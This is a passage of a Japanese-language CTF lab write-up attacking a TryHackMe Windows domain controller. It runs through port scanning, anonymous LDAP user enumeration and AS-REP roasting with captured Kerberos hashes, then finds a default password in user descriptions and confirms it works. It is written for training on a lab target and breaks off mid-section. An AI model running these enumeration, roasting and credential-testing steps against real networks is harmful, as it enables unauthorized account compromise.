| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2IwxsVm2r2hTQVvNrlaszoA4tZEl
| Vngz+xQNEFvi2pJX/FuVbOviuhfKP5yeotBM6WpT4LDr5vRZJXBzp5MTaei4jaFG
| rXuz6af2CuZ0cE2YzbFxu5GDNhtBAg/XetoJLW4M6dq2PzwJpnDYsmYBjjWPm6UV
| B2JQzoaXAa6TEAamReeynA66ZoOAMEDkHwR7kIdTVgk7rF6t0ikqgB1Ji1brl2FV
| Gocb5ajMu8o2H5iMb4jzT7jWfA21tME9sKkFw4jamb105rdWGwu8D6wtX1O6v79m
| VcGWowWXTM1GmDJv8dE50ZSNjx051lDTangjAgj+PbJ5YeEIbXyosXuFgQIDAQAB
| o4IDQjCCAz4wLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIA
| bwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8B
| Af8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZI
| hvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAEC
| MAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUSvJ+
| XzE5VSR2n89rzpq1bismKSowHwYDVR0jBBgwFoAUCXC348VycpOwcQwjQqSW/b4C
| HRMwgc4GA1UdHwSBxjCBwzCBwKCBvaCBuoaBt2xkYXA6Ly8vQ049dGhtLUxBQllS
| SU5USC1DQSxDTj1sYWJ5cmludGgsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9dGhtLERDPWxv
| Y2FsP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1j
| UkxEaXN0cmlidXRpb25Qb2ludDCBwAYIKwYBBQUHAQEEgbMwgbAwga0GCCsGAQUF
| BzAChoGgbGRhcDovLy9DTj10aG0tTEFCWVJJTlRILUNBLENOPUFJQSxDTj1QdWJs
| aWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9u
| LERDPXRobSxEQz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9
| Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA/BgNVHREEODA2oB8GCSsGAQQBgjcZAaAS
| BBD12WVTnqWuQJRIswNyBhF8ghNsYWJ5cmludGgudGhtLmxvY2FsME0GCSsGAQQB
| gjcZAgRAMD6gPAYKKwYBBAGCNxkCAaAuBCxTLTEtNS0yMS0xOTY2NTMwNjAxLTMx
| ODU1MTA3MTItMTA2MDQ2MjQtMTAwODANBgkqhkiG9w0BAQsFAAOCAQEAaTn4Z9XD
| lLy+HrYZ9hyFo23AyOCo16CRbyG3y4jJ+cEyOpNTg5AaLUFGWATqhBFlFkxshycf
| fEKSbq/pD+6Xwlrt518Cr5FVbEPv8IqvheAlL7KtkgRWO5uVqLupUyRslAN+g7CK
| 4IDSrufw4O6r93YYi4/7HCSUPr4hO/SVNM90T952DUkDjDJo5W7uVTzelUPEkD5x
| jqyvyrDm3ys++oqlunS9bZ5F5qkugqIhEBqR9iwiCPsuXcmuo7JNcjet7bdV1Whu
| I1tFNZc1F2UE2iQlLJfTWwbw0gcc4y1GdgFU9ou7ZbdvVaxImE7C0dwU6RIgJj0N
| lmwp0rZTVdv7qw==
|_-----END CERTIFICATE-----
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Issuer: commonName=labyrinth.thm.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-22T10:23:29
| Not valid after:  2025-12-22T10:23:29
| MD5:   266f:6af9:2a2d:0903:8e1f:0e16:7c08:1fb5
| SHA-1: dd57:a4d8:4435:a708:b3c1:f3f4:8ec4:258a:806b:58f9
| -----BEGIN CERTIFICATE-----
| MIIC6jCCAdKgAwIBAgIQTHVYv5iVq71N/W63un5SujANBgkqhkiG9w0BAQsFADAe
| MRwwGgYDVQQDExNsYWJ5cmludGgudGhtLmxvY2FsMB4XDTI1MDYyMjEwMjMyOVoX
| DTI1MTIyMjEwMjMyOVowHjEcMBoGA1UEAxMTbGFieXJpbnRoLnRobS5sb2NhbDCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANFXqM/i0I2Zk0vqNRHD+hGF
| tiDpUbXnAtn2S7Tm2yZRayhRH+7MLwPsZ+Z2BnQBx9fei56l5FUuLD2WPTVD1jg2
| RK0uTRJQE4pxXxWp07ZdA3bRY3V9xyR2J/GCRvoLzYKinPZ/zk3RrNbCg5jn7cob
| 8uQ517MstYmJSc6cWx75S8IkHTY8ToqZL7bp3Lim/nNuX/1NU7JtTwx7rUz+VQDX
| 4uQZ6u8iBv4bE/Q3JUrbBs2/g+Lvxgi0CxuYdNZ2CBEgr3jc/ZK2Pr04HkENNtiU
| /TcRFlwQ9fYoMFW5ITk1WSSn2lzi+xg0J2MPSAuaK0M4suTuv0vAX0ZwYl0STxEC
| AwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqG
| SIb3DQEBCwUAA4IBAQCprcTv4i23U/Z8OuBY/XB1WDHdr9I0p57vfHddFr0/qE97
| ZY4VP3Tf3Y8c/IISGfBHpe8edcqKeyIFDx8TPXN3eJyUQpi5cSGvdF2O65FWc3t+
| Lf+089AnpHTLauEZshNQ7xB/cKCnckNOU8q8vyugmeIDAM0r0rzizpPXoVNDIWVB
| zuh31gcYU2QXnsQXLUsn3/uKDMmz+C2zmcrDdtnBjI6etiWP8YK4ixJTAH1mj4KM
| u1+QiodGtiJ0lncAY6unQJBVW3cJm+lKro0eL9hBNtM/pJTSxN9SQJuJPNgS4WqY
| ivgWBevkatvtIUDU+rCTmK6qfCzY2mOERDx9J4SL
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: LABYRINTH
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: labyrinth.thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-23T10:33:01+00:00
|_ssl-date: 2025-06-23T10:33:24+00:00; -1s from scanner time.
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49685/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49718/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49721/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49726/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49793/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2019 (96%), Microsoft Windows 10 (93%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1903 (92%), Windows Server 2019 (92%), Microsoft Windows Vista SP1 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=6/23%OT=53%CT=%CU=41814%PV=Y%DS=2%DC=T%G=N%TM=68592D7A%P=aarch64-unknown-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS=U)
SEQ(SP=106%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=U)
OPS(O1=M508NW8NNS%O2=M508NW8NNS%O3=M508NW8%O4=M508NW8NNS%O5=M508NW8NNS%O6=M508NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M508NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: LABYRINTH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-23T10:33:04
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 27643/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12625/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 27473/udp): CLEAN (Failed to receive data)
|   Check 4 (port 31650/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   258.24 ms 10.9.0.1
2   258.38 ms 10.10.133.131

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:33
Completed NSE at 03:33, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:33
Completed NSE at 03:33, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:33
Completed NSE at 03:33, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.82 seconds
           Raw packets sent: 72 (4.596KB) | Rcvd: 76 (4.504KB)

```


確認すること
- SMB匿名ログインできるか
- LDAP匿名ログインできるか
- HTTP,HTTPSに何か隠れていないか


`/etc/hosts`に追加
```sh
10.10.133.131 labyrinth.thm.local thm.local
```

## Web
### Gobuster
- 特に有効な何かは見つからなかった
```sh
└─$ sudo dirsearch --url=http://10.10.133.131/ --wordlist=/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --threads 30 --random-agent --format=simple
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                               
 (_||| _) (/_(_|| (_| )                                                                                                                                                        
                                                                                                                                                                               
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 29999

Output File: /home/kali/Desktop/THM/machine/Ledger/reports/http_10.10.133.131/__25-06-23_05-33-45.txt

Target: http://10.10.133.131/

[05:33:45] Starting:                                                                                                                                                           
[05:33:50] 301 -  158B  - /aspnet_client  ->  http://10.10.133.131/aspnet_client/
[05:34:52] 404 -    2KB - /con                                              
[05:34:56] 301 -  158B  - /Aspnet_client  ->  http://10.10.133.131/Aspnet_client/
[05:35:42] 301 -  158B  - /aspnet_Client  ->  http://10.10.133.131/aspnet_Client/
[05:35:42] 404 -    2KB - /aux                                              
[05:37:12] 301 -  158B  - /ASPNET_CLIENT  ->  http://10.10.133.131/ASPNET_CLIENT/
[05:37:51] 400 -  324B  - /error%1F_log                                     
[05:38:24] 404 -    2KB - /prn                                              
                                                                             
Task Completed  
```


## SMB
匿名ログインは許可されていないが、guestでのログインは許可されてる
- $IPCは読み取り可能
```bash
└─$ smbmap   -H labyrinth.thm.local -u "" -p ""                         

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[!] Access denied on 10.10.133.131, no fun for you...                                                                        
[*] Closed 1 connections                                                                                                     
                                                                                                                                                                               
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Delivery]
└─$ smbmap   -H labyrinth.thm.local -u "guest" -p ""   

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.133.131:445       Name: labyrinth.thm.local       Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 


```


でも何もない
```sh
└─$ smbclient //labyrinth.thm.local/IPC$ -U guest
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*

```


## LDAP
匿名ログインできそう
```bash
ldapdomaindump ldap://$Target_IP --no-json -d DC=thm,DC=local
```

ユーザー名の取得
- できた
	- これを使って、AS-REP Roastingできないかな
```bash
└─$ ldapsearch -x -H ldap://$Target_IP -b "DC=THM,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -d" " -f2
Guest
LABYRINTH$
greg
SHANA_FITZGERALD
CAREY_FIELDS
DWAYNE_NGUYEN
BRANDON_PITTMAN
BRET_DONALDSON
VAUGHN_MARTIN
DICK_REEVES
EVELYN_NEWMAN
SHERI_DYER
NUMBERS_BARRETT
SUSANA_LOWERY
MIKE_TODD
JOSEF_MONROE
DAWN_DAVID
VIVIAN_VELAZQUEZ
WESLEY_FULLER
MARISOL_LANG
DIONNE_MCCOY
NOEL_BOOTH
TAMRA_BULLOCK
ROLAND_COLE
KATHY_WYNN
LORENA_BENSON
FELIX_CHARLES
ROBERTO_MORIN
VICTOR_WALTERS
AL_HAMPTON
RAYMUNDO_HOLLOWAY
FRANKIE_ASHLEY
DUANE_DRAKE
CODY_ROY
ANDERSON_CARDENAS
ARIEL_SYKES
DION_SANTOS
LAVERN_GOODWIN
BRENTON_HENRY
ROB_SALAZAR
RITA_HOWE
LETITIA_BERG
CECILE_PATRICK
PRINCE_HOFFMAN
KURT_GILMORE
JASPER_GARDNER
YVONNE_NEWTON
SHELLEY_BEARD
SILAS_WALLS
AMOS_MCPHERSON
DIEGO_HARTMAN
DINO_CARSON
JOSHUA_MOSLEY
HESTER_MCMAHON
MARJORIE_QUINN
LOU_BENNETT
LOU_CANTRELL
KERRY_JOHNSON
DIANE_ROWE
RANDY_HOWELL
WALDO_HOUSTON
FANNY_RIVERA
ANNMARIE_RANDALL
VIOLET_MEJIA
MARVA_CALLAHAN
AMOS_LEONARD
STELLA_RIVERS
JEROME_FERRELL
74820323SA
DERICK_BLEVINS
JANELL_GREGORY
SPENCER_DODSON
MILAGROS_HOGAN
LIZA_DALE
ADOLPH_PUCKETT
BRANDIE_GRANT
EVERETTE_HUFFMAN
<SNIP>

```

## AS-REP Roasting
LDAPで取得できたユーザー名をuser.txtに保存して、使う
```bash
impacket-GetNPUsers thm.local/ -dc-ip $Target_IP -no-pass -usersfile user.txt -format hashcat -outputfile asrep_hashes.txt
```
上のコマンドで、いくつかAS-REP RoastingでKerberosの事前認証を無効にしたアカウントのTGTハッシュが取得できた
首位得できたハッシュは、asrep_hashes.txtに保存される

取得できたTGTハッシュ一覧
```bash
$krb5asrep$23$SHELLEY_BEARD@THM.LOCAL:364a17b5cb8930e466b3422f1cc4c82c$16fbc3cce81e5ff40cacde8b8d4d90c28f19f16bddeb1d6ae5a370084a8bb0f28b4fb68db9fed829cd5343a89c055b0fc4aea4cad443727a5f62ff76f45842faabadd72cf162c7a1bf878422bdbf74480e15d9131a6e139f19d505bd6138469de14dda3c5795c30f5a6356dc508b100107f7789f1ba446441592516313771181343447fbd36e4c717511c2480eb5f0a87f2587a5e12ebc5281e1e3444715e345adb1ead193d2037456d702f7d5fac10b0a2fb451c3b2523d260b04795f17890cecdba8434d3c3d2147beee3f72a214c78236f31da0bb8f1e5eb99db48f30f48498bc5a60c8c3
$krb5asrep$23$ISIAH_WALKER@THM.LOCAL:c0b4d25ec0eb4c5a17c3e0fd7c7ae6d8$512ba2e73c8ca7dc029c98d61b858449a1a64a576941fbb110f097b78f919bf7fb84a709cea7300aa4708dd62847d3e9cf91ed324357b0149e1915e539433ff7bee144f2037b8ae13e51b94f6c4b8e2b067a1c96aad87eb698a53de1e80a640a210394c24aac1f09d52d65d2fa1d425304b0b3330a572f44f05e11ed2a9fbb674e7017e740bc9b9b2806aedca3946b96f078a119e2942252341d06e760050a783f36fffefd420fede377198569fe052b21714b33813a8287a9a9998bb403969b66e47500e69fa4eb152eb527356da3051912fe43d2c01939f9ee85cb5d803107a4b62e8a9641
$krb5asrep$23$QUEEN_GARNER@THM.LOCAL:6593f6131691b27a22e6f92ca218c0fe$2eb1f5ac6905ead20558224d96aac882d73313040297fbd2992c41816e3cca1eacef49e0d11967b112fcd551c2ebd7f90ba61541b8929c4b850a2999b8c1649288ac90417c09324790ea5c88e5adff76ed7007a038522c558fbdf941f183d2e20b1e2e54f8a76f066a8c75913e792c68e1c678821ebef5a1834cf4d17db6e2eb0b57400fd89b5ca1a456c8436fd175ff08920e9b68709c69638d25ddcc7ec909c55baa0ed20859a5bf8b448498c643c533341cb5bd9b120ca72918721cc000e816ea4805469ce77f7354e5c8f001ca989fc828907fb1042dbb50d333a88f8597178dccef10f3
$krb5asrep$23$PHYLLIS_MCCOY@THM.LOCAL:9b3d66813bb24dd222945020e6f18d8a$b8ea9050a77f6b843a38cb667c73d484aebb0dbaa2bff847c1844e29ce70e7f54d5ad212057a52765e6ce18720793449737be177fcb0e388ae423f5b6987a59af49c13c67d5a0bb81e1aa75648b4a392746d81900c7dbef04c09604c6cf3c82735143dc73de4db6a451228cdea6e9feacbf554b4a953f49f3ae5867cb2971d832c85c263294ac0fd7841e14786dc060f4de45f760992bc997c70236ca7ed37cf098ca3e51b81a1f45af0847fd33562ac0d0665d93296b47045c241fa67e5ac984c41338f4b814fc9eaa3c7d86b8ec4ebdf81dd1cdb39ea74732a78b1eb9e4b197db2e069b885
$krb5asrep$23$MAXINE_FREEMAN@THM.LOCAL:babb4a5e3994221e1b1999702e93516f$a60f8fb19ce0b89901fb92434a0b5deaac89e7ed41ca62d6a7dfecaae631f5bc8166bc0362cb32f82ffb39312cbe2223fd77bd5a4e3b2d5c2768591e648b4d992c873a0a1a7dfbefc1ea3cb7be8496da330f0f4154d0bd198ed1b19182897057d7646309aee422b6b3981c659f103a3f6234173fac59e9b0aa36bb300857b462786ee204ef969cf51db1c3d800f0d34db201a9e74a8787f733f9d3c3b4f3698a6f21d2801a5e50a135b7d7f5ad398bfb9ba29e72f8415328e71c72430386d487c444fde147e05ed9597a20f670ced1c72cb9f546a4810070c325d0b986bf688f079720e23ecd

```

ハッシュのクラックをしていく
- /usr/share/wordlists/rockyou.txt 
	-  割れない
```sh
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt 
```



```sh
$krb5asrep$18$SHELLEY_BEARD@THM.LOCAL:0f297737bda0d3b78566ef9e5364a484$d9f42b6263cfc4f1168322840cdeaefdfd8f003bae2a44933c5d1b3d2cd8291b449f008319419de78f4205ffa5899c93ddf232682c15e54af9f399c5961663d6585ff4072d786a4b8c038c0f5f8e8ec7aff5dd53cc1b74a1d6fbb3e997d53e48b2ba4bfd021f63a3e10371529a9fc7c6b3633617f77eded50d1504878bd42e04e3c9c490a495f6260b0bf047ba1eef03cfdc94bf3f416096e8d0a878126e7e698ae7a40e8feae706b25d738c6a1435d71c3749e344e61973bfb1c10b8167557becfba3148abc8b41075ee0b79121f505a1dda1f50b7935b1a8bf61470d6f064664b9dcacf6258bff43430bcc89a56e8e34f5d6b311635559320f
$krb5asrep$18$ISIAH_WALKER@THM.LOCAL:7efa4ad064f2d6c740f72ef90fde7216$f4c9923319f014999313a247777666ab89b09102948fbf97797a870813bb9870d89c7520543352c91ff3e2b8bc0164326694685d5b0c825a4880b156650c37f43dae93e744d3e87e40894d654c6719824c3a667f74e431db885561a9f24568e782ffcfc983dac8743f4c73899420a4fb0067733f2e4303a5606cf7d763b1da39f7dac6d81d06b76913f778a3b9c6e71cf0d1079da35b51c0e11caea07719f6322fd2c30314d9a1a79bcc119e4d7a46928f06280e75a26f2519d7b69774b6ed7f008f91cfae53bf3e20ec09198f2eb07009737bab347cdcbfef69d3a78c3a725fe75f7e96aa39f4fa18bef9ddc7fd8580d914aef064fb07a8cc0b
$krb5asrep$18$QUEEN_GARNER@THM.LOCAL:0e4d1ea160f1e4adda797de124cd5ee8$82a90a86a7fc59598a094d60f3305d0eed2ec56bb87c7a15f08f5ed8c399ea31cdff50aa9b2a11dc456f41322335c5d46f2a8738cc44bd65ee63c4276e8cf75ed6afc064f0946cf85ed6ab56ebc4f2fecfe07eee06c884df7855b62116555442e82c001a1e7c6aca9a607a7a8f97eb043820d5688418dc85d45a297a18bb02b8d12ad3f0fe985ddaa8aa51c27b024058aff60213565316814e631ad548a0aaabb1032c4a3c0fafd25b69f4602949068d1d7e7673da1b1c335a1ff961e73d5f364c469629d6a790c5e4909cf10ec2e78eec45952643784b93f3ca0b801e0675c8e031180677dcb4bf82e5353fd9978f73ad9cd0c4e01ceb27f792
$krb5asrep$18$PHYLLIS_MCCOY@THM.LOCAL:f8500ba13dab2d4b0dad1cf679097414$93b5730c5fb4e7a96d6f26419da6068101d782ffff68fb50a3ea516ccb60204885a0b120e1fc468bd27e0aeb8014fe7327e0d50424ebce094ebafc8339cf74be9dc6789903ce6c2a3666381483f04baa0d074ef9cdc1787fb9797758150ba430fa95d0c7fa1345cfc16759de62dc52d84681743536fb9c115803fee1f3b9b9a3eda7cdf64956f69b6dba9acb3abd37aad543140db8633932bf9ee461cfabaa815fc38834e20b71b70440c76af4e1d49fcb4c86a2e2e602343a7faff4b725d56ecc01f9ad2523b20d4ef3e45d2bd1f9b94393a3a78392dde802c610af8b6892e8d67cf64bb2e2bebe3b56b8e1870d928f553d03ca44bcc97c875d
$krb5asrep$18$MAXINE_FREEMAN@THM.LOCAL:2cbaa1847976036d2c3d9362f50e64ee$1ed06ceffe7ba5d13abcd0ec4325b1f9815a288f8689afa996126f5e169fc0ed1da42a3a1f4b953a6160552a1c609ecd6c3d1d7d122cbdf190209d746633a82523c52cdce9a6c5ae84c901f61912ca1e2083083648e02713920150e0d20e8f1dee4fed336235b6460db2db382f811aba2b9b8215ed828fef7a242e205e6afb1b27ee8726d61f2a2f1c310fdd7621f77409f721de1bbc6283d635a1d612bc031d4068ecdd241c0fd1aacb290afc44076e8218447218c87427ada4b489556809501995a05b2be1ae4837b03840de6fab674c4c062f1ada678fc8e4e744900fb0580e489807abf6ae6237a2bfa18410cc5f11c79d9868799db58de2
```


パスワードポリシーの列挙
- 最小パスワード長 : 7文字以上 
```sh
└─$ ldapsearch -H ldap://10.10.133.131 -x -b "DC=thm,DC=local" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
forceLogoff: -9223372036854775808
lockoutDuration: -6000000000
lockOutObservationWindow: -6000000000
lockoutThreshold: 0
maxPwdAge: -36288000000000
minPwdAge: -864000000000
minPwdLength: 7
modifiedCountAtLastProm: 0
nextRid: 1008
pwdProperties: 0
pwdHistoryLength: 24
```


## CrackMapExec
- ホストがWindows 10 / Server 2019 Build 17763 x64であることがわかる
- 確かに、SMBで匿名アカウントではログインできなさそう
```sh
└─$ crackmapexec smb $Target_IP --users

SMB         10.10.133.131   445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
SMB         10.10.133.131   445    LABYRINTH        [-] Error enumerating domain users using dc ip 10.10.133.131: NTLM needs domain\username and a password
SMB         10.10.133.131   445    LABYRINTH        [*] Trying with SAMRPC protocol

```

# Foothold
## nxc
CrackMapExecの後継で、LDAP に対して ゲスト認証でログインし、ADユーザー情報を列挙する
すると、Descriptionにパスワードが書かれてるユーザーがいる！！
```sh
nxc ldap labyrinth.thm.local -u 'guest' -p '' --users

LDAP        10.10.133.131   389    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 (name:LABYRINTH) (domain:thm.local)
LDAP        10.10.133.131   389    LABYRINTH        [+] thm.local\guest: 
LDAP        10.10.133.131   389    LABYRINTH        [*] Enumerated 487 domain users: thm.local
LDAP        10.10.133.131   389    LABYRINTH        -Username-                    -Last PW Set-       -BadPW-  -Description-               
LDAP        10.10.133.131   389    LABYRINTH        Guest                         <never>             0        Tier 1 User                 
LDAP        10.10.133.131   389    LABYRINTH        greg                          2023-05-15 07:49:03 0        Tier 1 User                 
LDAP        10.10.133.131   389    LABYRINTH        SHANA_FITZGERALD              2023-05-30 02:45:58 0                                   
LDAP        10.10.133.131   389    LABYRINTH        CAREY_FIELDS                  2023-05-30 02:45:58 0                                    
LDAP        10.10.133.131   389    LABYRINTH        DWAYNE_NGUYEN                 2023-05-30 02:45:58 0        Tier 1 User       

<SNIP>

LDAP        10.10.133.131   389    LABYRINTH        MORTON_BURNS                  2023-05-30 02:46:49 0                                    
LDAP        10.10.133.131   389    LABYRINTH        IVY_WILLIS                    2023-05-30 05:30:55 0        Please change it: CHANGEME2023!    

<SNIP>

LDAP        10.10.133.131   389    LABYRINTH        SUSANNA_MCKNIGHT              2023-07-05 08:11:32 0        Please change it: CHANGEME2023!    
<SNIP>
```

実際に使えるのか試してみる
使える！
```sh
└─$ nxc ldap 10.10.133.131 -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!'
LDAP        10.10.133.131   389    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 (name:LABYRINTH) (domain:thm.local)
LDAP        10.10.133.131   389    LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:CHANGEME2023! 
```

IVY_WILLISも使える!
```sh
└─$ nxc ldap 10.10.133.131 -u 'IVY_WILLIS' -p 'CHANGEME2023!'
LDAP        10.10.133.131   389    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 (name:LABYRINTH) (domain:thm.local)
LDAP        10.10.133.131   389    LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:CHANGEME2023! 
```


一旦これらのユーザーの権限を確認する

**SUSANNA_MCKNIGHT**
LDAPのDescripstionにも書いてあるけど、nxcの方がわかりやすいね
- Remote Management Usersだから、SUSANNA_MCKNIGHTは、WinRM使えるかも
	- でもこのサーバーではwinrmの5985が空いてない
- Remote Desktop Usersだから、RDP使えるかも
```sh
